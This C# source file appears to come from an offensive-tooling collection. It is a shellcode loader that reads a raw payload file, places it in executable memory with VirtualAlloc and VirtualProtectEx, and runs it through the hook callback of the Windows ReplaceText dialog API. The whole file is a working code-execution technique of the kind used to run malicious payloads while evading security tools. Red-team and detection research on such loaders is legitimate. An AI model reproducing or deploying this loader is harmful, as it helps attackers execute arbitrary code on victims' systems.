// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ReplaceText
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: ReplaceText.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);


            uint FR_ENABLEHOOK = 0x100;
            FINDREPLACE sFR = new FINDREPLACE();
            sFR.lStructSize = (uint)Marshal.SizeOf(sFR);
            sFR.hwndOwner = Process.GetCurrentProcess().MainWindowHandle;
            sFR.Flags = FR_ENABLEHOOK;
            sFR.lpfnHook = hAlloc;
            sFR.lpstrFindWhat = "h7arW";
            sFR.lpstrReplaceWith = "h7arW";
            sFR.wReplaceWithLen = 1;
            sFR.wFindWhatLen = 1;

            ReplaceText(ref sFR);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comdlg32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr ReplaceText(ref FINDREPLACE lpfr);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct FINDREPLACE
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public uint Flags;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpstrFindWhat;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpstrReplaceWith;
            public ushort wFindWhatLen;
            public ushort wReplaceWithLen;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public IntPtr lpTemplateName;
        }
    }
}
